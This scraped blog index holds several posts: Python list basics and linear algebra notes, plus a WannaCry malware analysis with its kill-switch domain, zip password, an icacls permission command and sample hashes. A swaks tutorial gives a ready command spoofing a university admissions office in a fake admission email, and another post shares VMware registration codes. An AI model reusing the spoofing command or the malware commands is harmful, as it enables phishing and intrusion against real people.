\u0026ldquo;永恒之蓝\u0026rdquo; 漏洞自动植入恶意代码，无需用户交互即可横向扩散。\n文件加密：感染设备后，病毒使用AES-256 对称加密和RSA-1024 非对称加密组合，将文档、照片、数据库等文件后缀改为.wncry，并在桌面显示勒索弹窗。\n赎金要求：索要 300-600 美元比特币，付款后承诺提供解密密钥，但实际仅有少数受害者成功恢复数据。\n3. 关键转折点 Kill Switch（自毁开关）：病毒代码中隐藏了一个检测特定域名（iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com）是否存在的机制。英国安全研究员马库斯・哈钦斯（Marcus Hutchins）以 8 英镑注册该域名，意外触发病毒自毁，阻止了约 10 万台设备感染。\n当时媒体对马库斯・哈钦斯的报道 变种威胁：5 月 14 日出现的 WannaCry 2.0 移除了 Kill Switch，传播速度更快，但未造成大规模二次爆发。\n二、病毒原理简单解析 1. 漏洞利用：永恒之蓝（MS17-010） 漏洞背景：该漏洞存在于 Windows SMBv1 协议实现中，攻击者通过发送特制数据包触发内存错误，实现远程代码执行（RCE）。 攻击流程： 扫描阶段：病毒通过 445 端口向目标主机发送 SMB 请求，探测是否存在漏洞。 漏洞触发：构造包含恶意指令的数据包，利用 SMB 协议中的缓冲区溢出漏洞，覆盖内存中的返回地址。 代码执行：强制目标系统执行病毒 Payload，下载并运行 WannaCry 本体。 2. 加密流程 密钥生成：每台感染设备生成唯一的 AES-256 密钥用于文件加密，该密钥再通过攻击者的 RSA 公钥加密后上传至控制服务器。 文件锁定：病毒遍历系统磁盘，对文档（.doc/.xls）、媒体（.mp4/.jpg）、数据库（.mdb/.sql）等 70 余种格式文件进行加密，同时删除原始文件备份。 3. 传播扩散 横向移动：成功感染一台设备后，病毒通过以下方式继续传播： 漏洞复用：利用相同的永恒之蓝漏洞攻击局域网内其他未打补丁的设备。 共享渗透：扫描网络共享目录，尝试弱密码登录并植入病毒。 传播速度：由于许多企业未及时更新系统（如 Windows XP、Server 2003），病毒在数小时内形成全球扩散。 三、样本深度分析 该病毒分为两个部分：\n蠕虫部分，用于病毒传播，并释放出勒索病毒。\n勒索病毒部分，加密用户文件索要赎金。\n1. 蠕虫部分详细分析： 1.蠕虫代码运行后先会连接域名：http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com 如果该域名可以成功连接，则直接退出。\n关于这个“Kill Switch”的存在网络上众说纷纭，我们认为相对可靠的解释是：开关的存在是为了检测安全软件沙箱。这种手法多见于恶意代码混淆器，但是除了看到几个人为修改“Kill Switch”的样本外，该病毒并没有批量生成、混淆的迹象。另外，如果真是为了对抗安全软件沙箱，和以往对抗沙箱的样本比起来，这段代码过于简单，而且出现的位置也过于明显。所以，放置这样一个“低级”的“Kill Switch”具体出于何种原因，恐怕只有恶意代码作者能够解释了。\n2. 如果上述域名无法访问，则会安装病毒服务，服务的二进制文件路径为当前进程文件路径，参数为：-m security，并启动服务。\n3. 释放资源到C:WINDOWS目录下的tasksche.exe（该程序是勒索病毒），并将其启动。\n4. 蠕虫病毒服务启动后，会利用MS17-010漏洞传播。传播分为两种渠道，一种是局域网传播，另一种是公网传播。如下图所示：\n局域网传播主要代码如下图：\n病毒会根据用户计算机内网IP，生成覆盖整个局域网网段表，然后循环依次尝试攻击。相关代码如下：\n公网传播主要代码如下图，病毒会随机生成IP地址，尝试发送攻击代码。\nSMB漏洞攻击数据包数据，如下图所示：\nWorm病毒的PE文件中包含有两个动态库文件，是攻击模块的Payload，分别是：x86版本的payload，大小0x4060和x64版本的payload，大小0xc8a4。\n两个Payload都是只有资源目录结构没有具体资源的无效PE动态库文件。病毒在攻击前，会构造两块内存，在内存中分别组合Payload和打开Worm病毒自身，凑成有效攻击Payload，代码如下图所示：\n有效攻击Payload模型如下：\n完整的攻击Payload的资源如下图，资源中的第一个DWORD是病毒大小，之后就是病毒本身。\n然后使用MS17-010漏洞，通过APC方式注入动态库到被攻击计算机的Lsass.exe，并执行Payload动态库的导出函数PlayGame，该函数非常简单，功能就是释放资源“W”到被攻击计算机“C:Windowsmssecsvc.exe”，并执行，如下图所示：\n火绒剑监控被攻击计算机的如下：\n被攻击的计算机包含病毒的完整功能，除了会被勒索，还会继续使用MS17-010漏洞进行传播，这种传播呈几何级向外扩张，这也是该病毒短时间内大规模爆发的主要原因。如下图：\n目前，攻击内网IP需要用户计算机直接暴露在公网且没有安装相应操作系统补丁的计算机才会受到影响，因此那些通过路由拨号的个人用户，并不会直接通过公网被攻击。如果企业网络也是通过总路由出口访问公网的，那么企业网络中的电脑也不会受到来自公网的直接攻击。但是，现实中一些机构的网络存在直接连接公网的电脑，且内部网络又类似一个大局域网，因此一旦暴露在公网上的电脑被攻破，就会导致整个局域网存在被感染的风险。\n2. 勒索病毒部分详细分析： 1. 该程序资源中包含带有密码的压缩文件，使用密码“WNcry@2ol7”解压之后释放出一组文件：\na) taskdl.exe，删除临时目录下的所有“*.WNCRYT”扩展名的临时文件。\nb) taskse.exe，以任意session运行指定程序。\nc) u.wnry，解密程序，释放后名为@WanaDecryptor@.exe。\nd) b.wnry勒索图片资源。\ne) s.wnry，包含洋葱路由器组件的压缩包。病毒作者将勒索服务器搭建在”暗网”，需要通过tor.exe和服务器进行通信。\nf) c.wnry，洋葱路由器地址信息。\ng) t.wnry，解密后得到加密文件主要逻辑代码。\nh) r.wnry，勒索Q\u0026amp;A。\n2. 通过命令行修改所有文件的权限为完全访问权限。命令行如下：\nicacls . /grant Everyone:F /T /C /Q\n3. 解密t.wnry文件数据得到含有主要加密逻辑代码的动态库，通过其模拟的LoadLibrary和GetProcAddress函数调用该动态库中的导出函数执行其加密逻辑。\n调用勒索动态库代码，如下图所示：\n勒索主逻辑执行，先会导入一个存放在镜像中的RSA公钥，之后调用CryptGenKey生成一组RSA算法的Session key。之后将这组Key的公钥通过CryptExportKey导出，再写入到00000000.pky文件中。将Session key中的私钥用刚导入RSA公钥进行加密，存放在00000000.eky如下图所示： 如果遍历到的文件扩展名在欲加密的文件扩展名列表中，如下图所示：\n对于每个需要加密的文件，都会调用CryptGenRadom随机生成AES密钥，之后使用Session Key中的RSA公钥对AES密钥进行加密，存放在加密后的数据文件头中，之后将原始文件数据用该AES密钥进行加密。如下图所示：\n整体加密流程，如下图所示：\n因为病毒是生成加密过的用户文件后再删除原始文件，所以存在通过文件恢复类工具恢复原始未加密文件的可能。但是因为病毒对文件系统的修改操作过于频繁，导致被删除的原始文件数据块被覆盖，致使实际恢复效果有限。且随着系统持续运行，恢复类工具恢复数据的可能性会显著降低。\n四、 关于“WannaCry”新变种的说明\n早期版本的“WannaCry”病毒存在“Kill Switch”开关，也就是病毒中检测“http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com”这个网址是否可以访问的代码片段，如果可以访问则不会利用“永恒之蓝”漏洞继续传播。\n现在这个域名已经被注册，这个版本“WannaCry”传播功能等于已经关闭，因为这段代码本身没有加密，所以很可能会被得到改病毒样本的“骇客”修改，放开开关，使病毒继续传播。\n截止到今日，收集到的所谓“WannaCry”最新版本的“变种”，正如我们推测的一样，网上两个“热炒\u0026quot;变种, SHA256分别为：\n32f24601153be0885f11d62e0a8a2f0280a2034fc981d8184180c5d3b1b9e8cf\nc8d816410ebfb134ee14d287a34cea9d34d627a2c5e16234ab726cf9fde47ec6\n和早期的“WannaCry”相比\nSHA256：24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c\n有明显人为修改痕迹，如下图所示：\n这个样本仅仅是16进制修改了两个字节，让\u0026quot;Kill Switch\u0026quot;失效，这个修改不会影响检测。\n另外一个样本除了修改了\u0026quot;Kill Switch\u0026quot;域名，还修改了病毒携带勒索模块。经过测试勒索代码已经被修改坏了，无法运行。如下图：\n除了以上两个样本，火绒还截获另一个人为修改的” WannaCry “样本，同样被修改的不能运行\nSHA256如下：\n99c0d50b088df94cb0b150a203de6433cb97d4f8fd3b106ce442757c5faa35c4\n","date":"2025-11-03T13:18:39+08:00","image":"https://s.secrss.com/anquanneican/eba6dc46083f85d24ac9474fa735590a.jpg","permalink":"https://www.retr0.xyz/p/%E5%9B%9E%E5%BF%86%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92wannacry%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90/","title":"回忆勒索病毒WannaCry：深度剖析"},{"content":"列表的标准定义形式 1 list = [1,2,\u0026#39;三\u0026#39;,d,\u0026#39;我是一个元素\u0026#39;] 列表的常用操作 正向索引： 注意正向索引时从列表内第一个元素开始，其下标号为0，向右以此为1、2、3……\n反向索引：注意反向索引时从列表内倒数第一个元素开始，其下标号为-1，向左以此为-2、-3……\n1 list[N] #其中N为列表元素的下标号，‘list’要换为实际列表名 查询列表中元素的下标号 1 list.index(\u0026#39;我是一个元素\u0026#39;)\t#‘list’要换为实际列表名 特别地，对于嵌套列表需要指定除了所查询元素在其列表的下标号之外的所有下标号，例如\n1 2 list = [[1,2,3],[4,5,6],[7,8,9]] print(list[1].index(5))\t#此处我们查询元素‘5’的下标号 修改指定位置的元素 支持正反索引下标号\n1 list[2] = \u0026#39;example\u0026#39;\t#列表[下标] = 值 列表的插入 1 2 3 list = [1,2,3,4] list.insert(1,\u0026#39;Hello\u0026#39;)\t#列表.insert(下标，值)\t在所填下标之前插入一个值 print(list) 列表的追加 追加单个元素\n1 2 3 list = [1,2,3,4] list.append(\u0026#39;五\u0026#39;)\t#列表.append(值)\t在列表尾追加一个元素 print(list) 追加一批元素\n1 2 3 4 list1 = [1,2,3,4] list2 = [5,6,7] list1.extend(list2)\t#列表.extend(数据容器)\t在列表尾导入一批元素，此处括号内直接填写也可以 print(list1) 删除元素 方法一：del指定下标删除\t注意：由于del是Python主环境中的一个关键字，所以到此只有它的语法是放在列表名前面的\n1 2 3 list = [1,2,3] del list[0]\t#del 列表[下标] print(list) 方法二：pop取出\n1 2 3 4 list = [1,2,3] a = list.pop(0)\t#列表.pop(下标) print(list) print(a)\t#获取被取出的元素 方法三：remove指定内容删除\t注意：remove方法会从前往后依次检索列表中的元素，并删除第一个匹配的元素，如果想删除多个相同元素，请执行多次remove\n1 2 3 list = [\u0026#39;一\u0026#39;,\u0026#39;二\u0026#39;,\u0026#39;删我\u0026#39;,\u0026#39;三\u0026#39;,\u0026#39;删我\u0026#39;] list.remove(\u0026#39;删我\u0026#39;)\t#列表.remove(元素值) print(list) 清空列表 1 2 3 list = [1,2,3] list.clear()\t#列表.clear() print(list) 统计某元素在列表中的数量 1 2 list = [1,2,3,2,8,2,5,2]\tprint(list.count(2))\t#列表.count(元素值) 统计列表内全部元素数量 注意：它的语法也是放在列表名前面的\n1 2 list = [1,2,3,2,8,2,5,2]\tprint(len(list))\t#len(列表) 列表的排序 sort()函数 默认升序（数字从小到大，首字母从前到后），且会修改当前列表\n1 2 3 4 5 6 list1 = [10, 8, 3, 22, 33, 7, 11, 100, 54] list2 = [\u0026#39;f\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;a\u0026#39;,\u0026#39;e\u0026#39;] list1.sort() list2.sort() print(list1) print(list2) 可选参数：reverse\t降序\n1 2 3 list = [1,2,3,4,5] list.sort(reverse=True) print(list) 可选参数：key\t自定义排序\n1 2 3 list = [\u0026#39;java\u0026#39;,\u0026#39;python\u0026#39;,\u0026#39;C++\u0026#39;,\u0026#39;go\u0026#39;] list.sort(key=len)\t#此处以长度为参考量，仅为其中一种用法 print(list) 你也可以将其组合\n1 2 3 list = [\u0026#39;java\u0026#39;,\u0026#39;python\u0026#39;,\u0026#39;C++\u0026#39;,\u0026#39;go\u0026#39;] list.sort(key=len,reverse=True)\tprint(list) sorted()函数 用法与sort()一致，但是不会修改列表本身，而是将修改后的列表创建一个副本。简而言之，你需要一个变量来接收它。\n1 2 3 list = [\u0026#39;java\u0026#39;,\u0026#39;python\u0026#39;,\u0026#39;C++\u0026#39;,\u0026#39;go\u0026#39;] a = sorted(list,key=len,reverse=True) print(a) 我们来比较一下二者的区别\n1 2 3 4 5 6 7 8 list1 = [5,4,3,2,1] list2 = [5,4,3,2,1] list3 = list1.sort() list4 = sorted(list2) print(list1)\t#[1, 2, 3, 4, 5]\t列表本身也被修改 print(list2)\t#[5, 4, 3, 2, 1]\t可见列表本身未被修改 print(list3)\t#None\t因为sort()函数不会传出修改后的列表 print(list4)\t#[1, 2, 3, 4, 5]\t列表的循环遍历 while循环 示例：\n1 2 3 4 5 6 list = [1,2,3,4,5] index = 0 while index \u0026lt; len(list): a = list[index] print(a)\t#对元素a进行处理 index += 1 for循环 示例：\n1 2 3 4 list = [1,2,3,4,5] for i in range (0,len(list)): a = list[i] print(a) ","date":"2025-11-02T22:54:24+08:00","permalink":"https://www.retr0.xyz/p/6.1-%E6%95%B0%E6%8D%AE%E5%AE%B9%E5%99%A8%E5%88%97%E8%A1%A8/","title":"6.1 数据容器：列表"},{"content":"一、伴随矩阵与伴随矩阵法求逆矩阵 1. 伴随矩阵的定义 对于n阶方阵$A = (a_{ij})$，其代数余子式$A_{ij}$定义为：$A_{ij} = (-1)^{i+j}M_{ij}$，其中$M_{ij}$是$A$中去掉第$i$行第$j$列后剩余子矩阵的行列式（即余子式）。\n伴随矩阵$A^*$是由$A$的代数余子式按转置顺序排列而成的矩阵，即： $$ A^* = \\begin{pmatrix} A_{11} \u0026 A_{21} \u0026 \\cdots \u0026 A_{n1} \\\\ A_{12} \u0026 A_{22} \u0026 \\cdots \u0026 A_{n2} \\\\ \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\ A_{1n} \u0026 A_{2n} \u0026 \\cdots \u0026 A_{nn} \\end{pmatrix} $$2. 伴随矩阵的核心性质 对于任意n阶方阵$A$，有： $$ A \\cdot A^* = A^* \\cdot A = |A|I_n $$ 其中$|A|$是$A$的行列式，$I_n$是n阶单位矩阵。\n3. 伴随矩阵法求逆矩阵 可逆条件：矩阵$A$可逆的充要条件是$|A| \\neq 0$。\n逆矩阵公式：若$|A| \\neq 0$，则$A$的逆矩阵为： $$ A^{-1} = \\frac{1}{|A|}A^* $$推导过程：由$A \\cdot A^* = |A|I_n$，两边同时除以$|A|$（因$|A| \\neq 0$），得： $$ A \\cdot \\frac{1}{|A|}A^* = I_n $$ 根据逆矩阵的定义，可知$\\frac{1}{|A|}A^$是$A$的逆矩阵，即$A^{-1} = \\frac{1}{|A|}A^$。\n4. 示例：用伴随矩阵法求2阶矩阵的逆 设$A = \\begin{pmatrix} 1 \u0026amp; 2 \\ 3 \u0026amp; 4 \\end{pmatrix}$，求$A^{-1}$。\n步骤1：计算行列式$|A|$ $$ |A| = 1 \\times 4 - 2 \\times 3 = 4 - 6 = -2 \\neq 0 $$ 故$A$可逆。\n步骤2：计算代数余子式，构造伴随矩阵$A^*$\n$A_{11} = (-1)^{1+1} \\times 4 = 4$，$A_{12} = (-1)^{1+2} \\times 3 = -3$ $A_{21} = (-1)^{2+1} \\times 2 = -2$，$A_{22} = (-1)^{2+2} \\times 1 = 1$ 因此，伴随矩阵： $$ A^* = \\begin{pmatrix} A_{11} \u0026 A_{21} \\\\ A_{12} \u0026 A_{22} \\end{pmatrix} = \\begin{pmatrix} 4 \u0026 -2 \\\\ -3 \u0026 1 \\end{pmatrix} $$ 步骤3：代入逆矩阵公式 $$ A^{-1} = \\frac{1}{|A|}A^* = \\frac{1}{-2} \\begin{pmatrix} 4 \u0026 -2 \\\\ -3 \u0026 1 \\end{pmatrix} = \\begin{pmatrix} -2 \u0026 1 \\\\ \\frac{3}{2} \u0026 -\\frac{1}{2} \\end{pmatrix} $$ 验证（可选）： $$ A \\cdot A^{-1} = \\begin{pmatrix} 1 \u0026 2 \\\\ 3 \u0026 4 \\end{pmatrix} \\begin{pmatrix} -2 \u0026 1 \\\\ \\frac{3}{2} \u0026 -\\frac{1}{2} \\end{pmatrix} = \\begin{pmatrix} 1 \\times (-2) + 2 \\times \\frac{3}{2} \u0026 1 \\times 1 + 2 \\times (-\\frac{1}{2}) \\\\ 3 \\times (-2) + 4 \\times \\frac{3}{2} \u0026 3 \\times 1 + 4 \\times (-\\frac{1}{2}) \\end{pmatrix} = \\begin{pmatrix} 1 \u0026 0 \\\\ 0 \u0026 1 \\end{pmatrix} = I_2 $$ 验证成立。\n二、初等变换法求逆矩阵 1. 核心原理 对于n阶可逆矩阵$A$，构造增广矩阵$[A \\mid I_n]$（$I_n$为n阶单位矩阵），通过初等行变换（不可混用列变换）将左侧的$A$化为$I_n$，此时右侧原$I_n$会同步化为$A^{-1}$，即： $$ [A \\mid I_n] \\xrightarrow{初等行变换} [I_n \\mid A^{-1}] $$2. 关键步骤 构造增广矩阵：将$A$与同阶单位矩阵并排拼接，形成$[A \\mid I_n]$； 初等行变换（仅3种：换行、某行乘非零常数、某行加另一行的$k$倍）； 当左侧$A$化为$I_n$时，右侧矩阵即为$A^{-1}$； 验证（可选）：计算$A \\cdot A^{-1}$，若结果为$I_n$则正确。 3. 示例：用初等变换法求3阶矩阵的逆 设$A = \\begin{pmatrix} 1 \u0026amp; 0 \u0026amp; 1 \\ 2 \u0026amp; 1 \u0026amp; 0 \\ -3 \u0026amp; 2 \u0026amp; -5 \\end{pmatrix}$，求$A^{-1}$。\n步骤1：构造增广矩阵$[A \\mid I_3]$ $$ [A \\mid I_3] = \\begin{pmatrix} 1 \u0026 0 \u0026 1 \u0026 \\vdots \u0026 1 \u0026 0 \u0026 0 \\\\ 2 \u0026 1 \u0026 0 \u0026 \\vdots \u0026 0 \u0026 1 \u0026 0 \\\\ -3 \u0026 2 \u0026 -5 \u0026 \\vdots \u0026 0 \u0026 0 \u0026 1 \\end{pmatrix} $$ 步骤2：初等行变换\n消去第2、3行第1列元素：\n第2行 = 第2行 - 2×第1行：$R_2 = R_2 - 2R_1$ 第3行 = 第3行 + 3×第1行：$R_3 = R_3 + 3R_1$ 得到： $$ \\begin{pmatrix} 1 \u0026 0 \u0026 1 \u0026 \\vdots \u0026 1 \u0026 0 \u0026 0 \\\\ 0 \u0026 1 \u0026 -2 \u0026 \\vdots \u0026 -2 \u0026 1 \u0026 0 \\\\ 0 \u0026 2 \u0026 -2 \u0026 \\vdots \u0026 3 \u0026 0 \u0026 1 \\end{pmatrix} $$ 消去第3行第2列元素：\n第3行 = 第3行 - 2×第2行：$R_3 = R_3 - 2R_2$ 得到： $$ \\begin{pmatrix} 1 \u0026 0 \u0026 1 \u0026 \\vdots \u0026 1 \u0026 0 \u0026 0 \\\\ 0 \u0026 1 \u0026 -2 \u0026 \\vdots \u0026 -2 \u0026 1 \u0026 0 \\\\ 0 \u0026 0 \u0026 2 \u0026 \\vdots \u0026 7 \u0026 -2 \u0026 1 \\end{pmatrix} $$ 化为行最简形（首元为1，消去上方对应元素）：\n第3行 = 第3行 × $\\frac{1}{2}$：$R_3 = \\frac{1}{2}R_3$ 第1行 = 第1行 - 1×第3行：$R_1 = R_1 - R_3$ 第2行 = 第2行 + 2×第3行：$R_2 = R_2 + 2R_3$ 最终得到： $$ \\begin{pmatrix} 1 \u0026 0 \u0026 0 \u0026 \\vdots \u0026 -\\frac{5}{2} \u0026 1 \u0026 -\\frac{1}{2} \\\\ 0 \u0026 1 \u0026 0 \u0026 \\vdots \u0026 5 \u0026 -1 \u0026 1 \\\\ 0 \u0026 0 \u0026 1 \u0026 \\vdots \u0026 \\frac{7}{2} \u0026 -1 \u0026 \\frac{1}{2} \\end{pmatrix} $$ 步骤3：得到逆矩阵 左侧已化为$I_3$，右侧即为$A^{-1}$： $$ A^{-1} = \\begin{pmatrix} -\\frac{5}{2} \u0026 1 \u0026 -\\frac{1}{2} \\\\ 5 \u0026 -1 \u0026 1 \\\\ \\frac{7}{2} \u0026 -1 \u0026 \\frac{1}{2} \\end{pmatrix} $$ 验证（可选）： 计算$A \\cdot A^{-1}$，结果为$I_3$（过程略），验证成立。\n","date":"2025-11-02T21:54:18+08:00","permalink":"https://www.retr0.xyz/p/%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%E6%B1%82%E9%80%86%E7%9F%A9%E9%98%B5/","title":"几种方法求逆矩阵"},{"content":"一、罗尔定理（Rolle\u0026rsquo;s Theorem） 1. 核心条件 函数 $f(x)$ 在闭区间 $[a, b]$ 上 连续； 函数 $f(x)$ 在开区间 $(a, b)$ 内 可导； 端点函数值相等：$f(a) = f(b)$。 2. 结论 存在至少一点 $\\xi \\in (a, b)$，使得 $f\u0026rsquo;(\\xi) = 0$。\n3. 使用例子 设 $f(x) = x^2 - 2x$，区间 $[0, 2]$。\n验证条件：$f(x)$ 是多项式（闭区间连续、开区间可导）；$f(0) = 0$，$f(2) = 0$，满足 $f(0)=f(2)$； 应用结论：求导得 $f\u0026rsquo;(x) = 2x - 2$，令 $f\u0026rsquo;(x)=0$，解得 $x=1$，即 $\\xi=1 \\in (0,2)$，符合定理。 二、拉格朗日中值定理（Lagrange\u0026rsquo;s Mean Value Theorem） 1. 核心条件 函数 $f(x)$ 在闭区间 $[a, b]$ 上 连续； 函数 $f(x)$ 在开区间 $(a, b)$ 内 可导。 2. 结论 存在至少一点 $\\xi \\in (a, b)$，使得 $f\u0026rsquo;(\\xi) = \\frac{f(b) - f(a)}{b - a}$（几何意义：曲线在 $\\xi$ 处的切线与端点连线平行）。\n3. 使用例子 设 $f(x) = \\ln x$，区间 $[1, e]$。\n验证条件：$f(x)$ 在 $[1,e]$ 连续、$(1,e)$ 可导； 应用结论：端点斜率 $\\frac{f(e) - f(1)}{e - 1} = \\frac{1 - 0}{e - 1} = \\frac{1}{e - 1}$；求导得 $f\u0026rsquo;(x) = \\frac{1}{x}$，令 $\\frac{1}{x} = \\frac{1}{e - 1}$，解得 $x = e - 1 \\in (1,e)$，即 $\\xi = e - 1$，符合定理。 三、柯西中值定理（Cauchy\u0026rsquo;s Mean Value Theorem） 1. 核心条件 函数 $f(x)$、$g(x)$ 均在闭区间 $[a, b]$ 上 连续； 函数 $f(x)$、$g(x)$ 均在开区间 $(a, b)$ 内 可导； 对任意 $x \\in (a, b)$，$g\u0026rsquo;(x) \\neq 0$； 端点函数值不等：$g(a) \\neq g(b)$。 2. 结论 存在至少一点 $\\xi \\in (a, b)$，使得 $\\frac{f(b) - f(a)}{g(b) - g(a)} = \\frac{f\u0026rsquo;(\\xi)}{g\u0026rsquo;(\\xi)}$（拉格朗日中值定理的推广，$g(x)=x$ 时退化为拉格朗日定理）。\n3. 使用例子 设 $f(x) = \\sin x$，$g(x) = \\cos x$，区间 $[0, \\frac{\\pi}{2}]$。\n验证条件：$f(x)$、$g(x)$ 均连续可导；$g\u0026rsquo;(x) = -\\sin x$，在 $(0, \\frac{\\pi}{2})$ 内不为0；$g(0)=1 \\neq g(\\frac{\\pi}{2})=0$； 应用结论：增量比 $\\frac{f(\\frac{\\pi}{2}) - f(0)}{g(\\frac{\\pi}{2}) - g(0)} = \\frac{1 - 0}{0 - 1} = -1$；导数比 $\\frac{f\u0026rsquo;(\\xi)}{g\u0026rsquo;(\\xi)} = \\frac{\\cos \\xi}{-\\sin \\xi} = -\\cot \\xi$；令 $-\\cot \\xi = -1$，解得 $\\xi = \\frac{\\pi}{4} \\in (0, \\frac{\\pi}{2})$，符合定理。 ","date":"2025-10-29T12:31:38+08:00","permalink":"https://www.retr0.xyz/p/%E4%B8%89%E4%B8%AA%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86/","title":"三个微分中值定理"},{"content":"一、矩阵的秩（核心定义） 矩阵的秩是最高阶非零子式的阶数，也等于矩阵行向量组/列向量组的“极大无关组个数”(通俗说：最多能找出多少个不互相“多余”的行/列)记为 $$r(A)$$。\n二、核心性质 非负性与有界性：$\\displaystyle 0 \\leq r(A) \\leq \\min{m, n}$（秩是0或正整数，不超过行数和列数）； 零矩阵专属：$\\displaystyle A = O \\iff r(A) = 0$（零矩阵秩为0，反之亦然）； 转置不变性：$\\displaystyle r(A^T) = r(A)$（矩阵与其转置秩相等）； 初等变换不变性：初等行/列变换后，矩阵秩不变； 和秩不等式：$\\displaystyle r(A + B) \\leq r(A) + r(B)$（两矩阵和的秩不超过各自秩的和）； 乘积秩不等式：$\\displaystyle r(AB) \\leq \\min{r(A), r(B)}$（两矩阵乘积的秩不超过任一矩阵的秩）； 可逆矩阵作用：$\\displaystyle r(PA) = r(AQ) = r(PAQ) = r(A)$（可逆矩阵左乘/右乘，秩不变）； 伴随矩阵秩关系： 若$\\displaystyle r(A) = n$，则$\\displaystyle r(A^*) = n$； 若$\\displaystyle r(A) = n-1$，则$\\displaystyle r(A^*) = 1$； 若$\\displaystyle r(A) \u0026lt; n-1$，则$\\displaystyle r(A^*) = 0$； 分块矩阵秩：$\\displaystyle r\\begin{pmatrix} A \u0026amp; O \\ O \u0026amp; B \\end{pmatrix} = r(A) + r(B)$（对角分块矩阵的秩等于各块秩的和）。 ","date":"2025-10-28T15:27:38+08:00","permalink":"https://www.retr0.xyz/p/%E7%9F%A9%E9%98%B5%E7%9A%84%E7%A7%A9%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/","title":"矩阵的秩及其性质"},{"content":"判断n阶方阵A是否可逆，核心看以下快速等价条件（满足其一即可，优先选前2个最便捷）：\n行列式非零：$|A| \\neq 0$（直接计算行列式，最快上手）； 矩阵满秩：秩$r(A) = n$（通过初等行变换看是否能化为单位矩阵）； 齐次方程组$AX = 0$只有零解； 行/列向量组线性无关； 存在方阵B，使得$AB = BA = I$（I为单位矩阵）。 ","date":"2025-10-28T15:27:38+08:00","permalink":"https://www.retr0.xyz/p/%E5%BF%AB%E9%80%9F%E5%88%A4%E6%96%AD%E7%9F%A9%E9%98%B5%E6%98%AF%E5%90%A6%E5%8F%AF%E9%80%86/","title":"快速判断矩阵是否可逆"},{"content":"1. 伪装学校邮件 大前提（原理）： 大多数学校的邮箱都可以使用代发服务 重要提醒： 接收邮件的邮箱只有网易系，qq邮箱因为安全限制问题无法接收到 打开终端并按需要输入指令\n指令例：\n1 swaks --body \u0026#34;学校紧急通知\u0026#34; --header \u0026#34;Subject:教务处\u0026#34; -t ⽬标邮箱@XXX.com -f admin@XXX.edu.cn 参数解释\nbody参数是发送过去邮件的内容\nheader是发送过去邮件的标题\n-t是我们的目标邮箱\n-f是发送者的邮箱\n\u0026ndash;attach是指定要附加的文件的路径\n2025年10月19日更新\n使用例：\n这里我们输入以下代码\n1 swaks --body \u0026#34;恭喜你已被我所拟录取，请在24小时内确认是否同意待录取，12小时后仍未确认的将取消资格。\u0026#34; --header \u0026#34;Subject:南京大学招生办：待录取通知\u0026#34; -t example@163.com -f zsb@nju.edu.cn 回车后查看接收邮箱\n发现正常接收了邮件，但是有提示可能伪造的标\n因此，在生活中各位务必确认邮件内容的真实性。\n","date":"2025-10-27T22:43:38+08:00","image":"https://www.retr0.xyz/post/kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/email.jpg","permalink":"https://www.retr0.xyz/p/swaks%E4%BC%AA%E9%80%A0%E9%82%AE%E4%BB%B6/","title":"swaks伪造邮件"},{"content":"代理工具： 很久以前：\nShadowsocksR 谁家文物\nReleases · ShadowsocksR-Live/ssrWin\n现在主流：\nv2rayN 支持vmess格式\nv2rayN/ at master · 2dust/v2rayN\nclash 最全能\nGitHub - clash-version/clash-download: Clash 下载|持续收藏CLash版本|2025年8月更新\n目前自用\nGitHub - chen08209/FlClash: A multi-platform proxy client based on ClashMeta,simple and easy to use, open-source and ad-free.\n备用方案：\n去tg上找破解vpn\n机场： GitHub推荐列表\nGitHub - yonghumeijj/jichang: 2025年最新性价比机场推荐VPN、翻墙🚀推荐稳定性高，适合各类人需求的机场\n目前自用\n一元机场（一月一块，包年12）\n备选方案：\n海外VPS自己部署 （不推荐）\n起飞： 选择合适的套餐订阅后在帮助文档中使用一键导入按钮导入节点 测试真延迟并选择延迟最低节点 芜湖起飞 孩子们，P站并不好看。\n","date":"2025-10-27T22:41:59+08:00","permalink":"https://www.retr0.xyz/p/%E9%AD%94%E6%B3%95%E4%B8%8A%E7%BD%91/","title":"魔法上网"},{"content":"虽说目前官网开放了个人免费下载使用，但是注册什么的对很多人还不是太友好，所以这里直接提供打包好的安装包和注册码\n链接：https://pan.quark.cn/s/85f0cadc8f12\n下载不多说，客户端下还是找解析网站自行解决\n安装除了位置自己看着改一下，其他下一步就完事了\n最后软件让你注册时，请输入压缩包内提供的注册码即可\n","date":"2025-10-27T22:39:38+08:00","permalink":"https://www.retr0.xyz/p/vmware%E7%9A%84%E5%AE%89%E8%A3%85/","title":"VMware的安装"},{"content":"感谢jm汉化组\n切换简中语言包 打开终端\n1 sudo dpkg-reconfigure locales 在打开的界面中使用pg up，pg dn，⬆️，⬇️翻页，使用空格选择，按tab切换到下方的确定和取消，按enter确定\n这里我们选择 zh_CN.UTF-8\n使用reboot重启即可\n换源 所谓换源就是切换软件仓库源\n这里需要修改以下文件sources.list\n在终端中输入\n1 sudo vim /etc/apt/sources.list ⚠️⚠️⚠️注意：这里需要使用到世界上最伟大的编辑器（没有之一）使用方法见下面的文章\n[retr0的小窝：Vim的使用](Vim的使用\n在文件末加上以下任意国内源\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # 官方源(国外的太慢不推荐) deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib #中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学 deb 